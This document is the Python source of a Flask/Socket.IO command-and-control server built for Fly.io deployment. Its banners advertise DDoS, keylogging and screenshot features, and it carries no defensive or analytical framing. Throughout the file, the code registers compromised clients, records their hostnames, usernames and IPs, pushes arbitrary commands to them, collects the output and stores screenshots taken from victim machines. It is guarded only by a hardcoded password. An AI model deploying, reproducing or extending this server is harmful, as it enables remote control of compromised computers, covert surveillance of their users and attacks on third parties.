#!/usr/bin/env python3
"""
C2 SERVER - Advanced Version with All Features
Fly.io compatible version
"""

from flask import Flask, request, jsonify, send_file
from flask_socketio import SocketIO, emit, join_room
from flask_cors import CORS
import os
import json
import base64
import hashlib
import time
from datetime import datetime
import secrets
import threading
from collections import defaultdict

# Initialize Flask app
app = Flask(__name__)
app.config['SECRET_KEY'] = secrets.token_hex(32)
app.config['MAX_CONTENT_LENGTH'] = 500 * 1024 * 1024  # 500MB

# Enable CORS
CORS(app)

# Initialize SocketIO
try:
    import eventlet
    eventlet.monkey_patch()
    socketio = SocketIO(app, 
                       cors_allowed_origins="*",
                       async_mode='eventlet',
                       ping_timeout=60,
                       ping_interval=25)
    print("[*] Using eventlet for WebSocket support")
except ImportError:
    socketio = SocketIO(app, 
                       cors_allowed_origins="*",
                       async_mode='threading')
    print("[*] Using threading mode")

# ============= CONFIGURATION =============

# Storage directories
for directory in ['uploads', 'downloads', 'screenshots']:
    os.makedirs(directory, exist_ok=True)

# In-memory storage
clients = {}
client_sockets = {}
command_results = {}
pending_commands = defaultdict(list)
authenticated_sessions = {}
console_sockets = []
attack_stats = defaultdict(lambda: {'clients': {}, 'total_packets': 0, 'start_time': time.time(), 'target': ''})

# Dashboard password (CHANGE THIS!)
DASHBOARD_PASSWORD = "C2RICARDO"

# ============= HELPER FUNCTIONS =============

def login_html():
    return """
    <!DOCTYPE html>
    <html>
    <head>
        <title>C2 Server - Login</title>
        <style>
            * { margin: 0; padding: 0; box-sizing: border-box; }
            body { font-family: 'Consolas', monospace; background: #000; color: #00ff00; 
                   display: flex; align-items: center; justify-content: center; height: 100vh; }
            .login-box { background: rgba(0, 255, 0, 0.05); border: 2px solid #00ff00; 
                        padding: 40px; border-radius: 10px; text-align: center; 
                        box-shadow: 0 0 20px rgba(0, 255, 0, 0.3); }
            h1 { font-size: 2em; margin-bottom: 10px; text-shadow: 0 0 10px #00ff00; }
            input[type="password"] { width: 300px; padding: 15px; margin-bottom: 20px;
                                    background: #000; border: 2px solid #00ff00; 
                                    color: #00ff00; border-radius: 5px; text-align: center; }
            button { width: 300px; padding: 15px; background: #00ff00; color: #000;
                    border: none; border-radius: 5px; cursor: pointer; font-weight: bold; }
        </style>
    </head>
    <body>
        <div class="login-box">
            <h1>🔒 ADVANCED C2 SERVER</h1>
            <p style="color:#00cc00;margin-bottom:30px;">Authorized Access Only</p>
            <form method="POST" action="/auth">
                <input type="password" name="password" placeholder="Enter Password" required autofocus>
                <br>
                <button type="submit">AUTHENTICATE</button>
            </form>
            <p style="color:#ff6b6b;margin-top:20px;font-size:0.8em;">⚠️ Unauthorized access is prohibited</p>
        </div>
    </body>
    </html>
    """

def dashboard_html():
    online = sum(1 for c in clients.values() if c.get('online', False))
    return f"""
    <!DOCTYPE html>
    <html>
    <head>
        <title>Advanced C2 Server Dashboard</title>
        <style>
            * {{ margin: 0; padding: 0; box-sizing: border-box; }}
            body {{ font-family: 'Consolas', monospace; background: #000; color: #00ff00; padding: 20px; }}
            .container {{ max-width: 1200px; margin: 0 auto; }}
            .header {{ text-align: center; margin-bottom: 30px; padding: 20px;
                     border: 2px solid #00ff00; border-radius: 10px; background: rgba(0, 255, 0, 0.05); }}
            .stats {{ display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
                    gap: 20px; margin: 30px 0; }}
            .stat-box {{ background: rgba(0, 255, 0, 0.05); border: 2px solid #00ff00;
                       padding: 20px; border-radius: 10px; text-align: center; }}
            .stat-number {{ font-size: 3em; font-weight: bold; text-shadow: 0 0 10px #00ff00; }}
        </style>
    </head>
    <body>
        <div class="container">
            <div class="header">
                <h1>⚡ ADVANCED C2 SERVER <span style="animation:pulse 2s infinite">●</span></h1>
                <p style="color:#00cc00">DDoS • KEYLOGGER • SCREENSHOTS • MULTI-CLIENT</p>
            </div>
            <div class="stats">
                <div class="stat-box"><div class="stat-number">{len(clients)}</div><div>Total Clients</div></div>
                <div class="stat-box"><div class="stat-number">{online}</div><div>Online Now</div></div>
                <div class="stat-box"><div class="stat-number">{len(command_results)}</div><div>Commands Executed</div></div>
            </div>
            <div style="text-align:center;margin-top:30px;">
                <a href="/" onclick="document.cookie='c2_session=; Max-Age=0'; return true;" 
                   style="color:#ff6b6b;text-decoration:none;padding:10px 20px;border:2px solid #ff6b6b;border-radius:5px;">
                   🚪 Logout</a>
            </div>
        </div>
    </body>
    </html>
    """

# ============= ROUTES =============

@app.route('/')
def index():
    session_id = request.cookies.get('c2_session')
    if session_id and session_id in authenticated_sessions:
        if authenticated_sessions[session_id] > time.time():
            return dashboard_html()
        else:
            del authenticated_sessions[session_id]
    return login_html()

@app.route('/auth', methods=['POST'])
def authenticate():
    password = request.form.get('password', '')
    if password == DASHBOARD_PASSWORD:
        session_id = secrets.token_hex(32)
        authenticated_sessions[session_id] = time.time() + 3600
        response = app.make_response(dashboard_html())
        response.set_cookie('c2_session', session_id, max_age=3600, httponly=True)
        return response
    else:
        return "<h1 style='color:#ff0000;text-align:center;margin-top:50px;'>⛔ ACCESS DENIED</h1>"

@app.route('/api/stats')
def get_stats():
    online = sum(1 for c in clients.values() if c.get('online', False))
    return jsonify({
        'total': len(clients),
        'online': online,
        'commands': len(command_results),
        'timestamp': time.time()
    })

@app.route('/api/clients')
def api_clients():
    client_list = []
    for client_id, client in clients.items():
        client_list.append({
            'id': client_id,
            'hostname': client.get('hostname', 'Unknown'),
            'username': client.get('username', 'Unknown'),
            'os': client.get('os', 'Unknown'),
            'online': client.get('online', False),
            'last_seen': client.get('last_seen', 0)
        })
    return jsonify(client_list)

@app.route('/api/command', methods=['POST'])
def send_command():
    data = request.get_json()
    client_id = data.get('client_id')
    command = data.get('command')
    
    if not client_id or not command:
        return jsonify({'error': 'Missing client_id or command'}), 400
    
    if client_id not in clients:
        return jsonify({'error': 'Client not found'}), 404
    
    cmd_id = f"cmd_{int(time.time())}_{secrets.token_hex(4)}"
    cmd_obj = {
        'id': cmd_id,
        'command': command,
        'timestamp': time.time(),
        'status': 'pending'
    }
    
    if client_id in client_sockets:
        socketio.emit('command', cmd_obj, room=client_sockets[client_id])
        return jsonify({'status': 'sent', 'command_id': cmd_id})
    else:
        pending_commands[client_id].append(cmd_obj)
        return jsonify({'status': 'queued', 'command_id': cmd_id})

@app.route('/api/ping')
def ping():
    return jsonify({'status': 'alive', 'timestamp': time.time()})

# ============= SOCKET.IO EVENTS =============

@socketio.on('connect')
def handle_connect():
    print(f"[+] New connection: {request.sid}")

@socketio.on('disconnect')
def handle_disconnect():
    for client_id, socket_id in list(client_sockets.items()):
        if socket_id == request.sid:
            if client_id in clients:
                clients[client_id]['online'] = False
                clients[client_id]['last_seen'] = time.time()
            del client_sockets[client_id]
            print(f"[-] Client disconnected: {client_id}")
            socketio.emit('client_offline', {'client_id': client_id})
            break
    
    if request.sid in console_sockets:
        console_sockets.remove(request.sid)

@socketio.on('register')
def handle_register(data):
    client_id = data.get('id')
    if not client_id:
        unique = f"{data.get('hostname', '')}{data.get('username', '')}{data.get('os', '')}"
        client_id = hashlib.sha256(unique.encode()).hexdigest()[:16]
    
    clients[client_id] = {
        'id': client_id,
        'hostname': data.get('hostname', 'Unknown'),
        'username': data.get('username', 'Unknown'),
        'os': data.get('os', 'Unknown'),
        'platform': data.get('platform', 'Unknown'),
        'ip': request.remote_addr,
        'online': True,
        'first_seen': clients.get(client_id, {}).get('first_seen', time.time()),
        'last_seen': time.time()
    }
    
    client_sockets[client_id] = request.sid
    join_room(client_id)
    
    print(f"[+] Client registered: {client_id} - {data.get('hostname')}")
    
    emit('welcome', {
        'client_id': client_id,
        'message': 'Connected to C2 Server',
        'timestamp': time.time()
    })
    
    socketio.emit('client_online', {
        'client_id': client_id,
        'hostname': data.get('hostname'),
        'platform': data.get('platform')
    })
    
    if client_id in pending_commands and pending_commands[client_id]:
        for cmd in pending_commands[client_id]:
            emit('command', cmd)
        pending_commands[client_id].clear()

@socketio.on('heartbeat')
def handle_heartbeat(data):
    client_id = data.get('client_id')
    if client_id and client_id in clients:
        clients[client_id]['last_seen'] = time.time()
        clients[client_id]['online'] = True
        emit('heartbeat_ack', {'timestamp': time.time()})

@socketio.on('result')
def handle_result(data):
    cmd_id = data.get('command_id')
    client_id = data.get('client_id')
    
    print(f"[*] Result received: {cmd_id} from {client_id}")
    
    command_results[cmd_id] = {
        'command_id': cmd_id,
        'client_id': client_id,
        'command': data.get('command', ''),
        'output': data.get('output', ''),
        'success': data.get('success', True),
        'status': data.get('status', 'completed'),
        'timestamp': time.time()
    }
    
    socketio.emit('command_result', command_results[cmd_id])
    socketio.emit('result_ready', command_results[cmd_id], room=client_id)

@socketio.on('console_connect')
def handle_console_connect(data):
    print(f"[+] Console connected: {request.sid}")
    console_sockets.append(request.sid)
    emit('console_ready', {'message': 'Connected to C2 server'})

@socketio.on('screenshot')
def handle_screenshot(data):
    client_id = data.get('client_id')
    img_data = data.get('data')
    
    if img_data:
        try:
            file_bytes = base64.b64decode(img_data)
            timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
            client_short = client_id[:8] if len(client_id) > 8 else client_id
            filename = f"screenshot_{client_short}_{timestamp}.png"
            file_path = os.path.join('screenshots', filename)
            
            with open(file_path, 'wb') as f:
                f.write(file_bytes)
            
            print(f"[📸] Screenshot received: {filename} ({len(file_bytes)} bytes)")
            
            socketio.emit('screenshot', {
                'client_id': client_id,
                'filename': filename,
                'size': len(file_bytes),
                'timestamp': time.time()
            })
        
        except Exception as e:
            print(f"[!] Screenshot save error: {e}")

# ============= CLEANUP THREAD =============

def cleanup_thread():
    while True:
        try:
            # Clean old command results
            cutoff = time.time() - 3600
            old_cmds = [cmd_id for cmd_id, result in command_results.items() 
                       if result.get('timestamp', 0) < cutoff]
            for cmd_id in old_cmds:
                del command_results[cmd_id]
            
            # Clean old files
            for folder in ['downloads', 'uploads', 'screenshots']:
                if os.path.exists(folder):
                    cutoff_time = time.time() - 86400
                    for filename in os.listdir(folder):
                        filepath = os.path.join(folder, filename)
                        if os.path.isfile(filepath) and os.path.getmtime(filepath) < cutoff_time:
                            try:
                                os.remove(filepath)
                            except:
                                pass
            
            time.sleep(300)
            
        except Exception as e:
            print(f"[!] Cleanup error: {e}")
            time.sleep(60)

threading.Thread(target=cleanup_thread, daemon=True).start()

# ============= MAIN ENTRY POINT =============

def main():
    port = int(os.environ.get('PORT', 8080))
    
    print("""
╔══════════════════════════════════════════════════════════════╗
║               ADVANCED C2 SERVER v3.0                        ║
║   DDoS • Keylogger • Screenshots • Multi-Client             ║
║                 FLY.IO COMPATIBLE                           ║
╚══════════════════════════════════════════════════════════════╝
""")
    
    print(f"[*] Starting Advanced C2 Server on port {port}")
    print(f"[*] Dashboard: http://0.0.0.0:{port}")
    print(f"[*] WebSocket: ws://0.0.0.0:{port}/socket.io")
    print()
    
    socketio.run(app, host='0.0.0.0', port=port, debug=False)

if __name__ == '__main__':
    main()
